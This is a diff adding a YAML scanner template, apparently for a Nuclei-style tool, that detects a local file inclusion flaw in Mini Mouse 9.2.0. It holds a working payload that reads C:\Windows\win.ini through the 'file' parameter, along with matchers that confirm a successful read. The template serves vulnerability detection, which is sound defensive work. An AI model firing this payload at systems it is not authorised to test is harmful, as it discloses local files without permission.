@@ -1,0 +1,32 @@
+id: "minimouse-lfi"
+name: "Mini Mouse 9.2.0 - Local File Inclusion"
+severity: "high"
+description: "Mini Mouse 9.2.0 is vulnerable to local file inclusion because it allows remote unauthenticated attackers to include and disclose the content of locally stored files via the 'file' parameter."
+tech:
+  - "generic"
+tags:
+  - "lfi"
+  - "edb"
+  - "minimouse"
+  - "vuln"
+cwe: "CWE-22"
+reference: "https://www.exploit-db.com/exploits/49744"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/file=C:%5CWindows%5Cwin.ini"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "status"
+    status:
+      - 200
+  - type: "word"
+    part: "body"
+    words:
+      - "bit app support"
+      - "fonts"
+      - "extensions"
+    condition: "and"
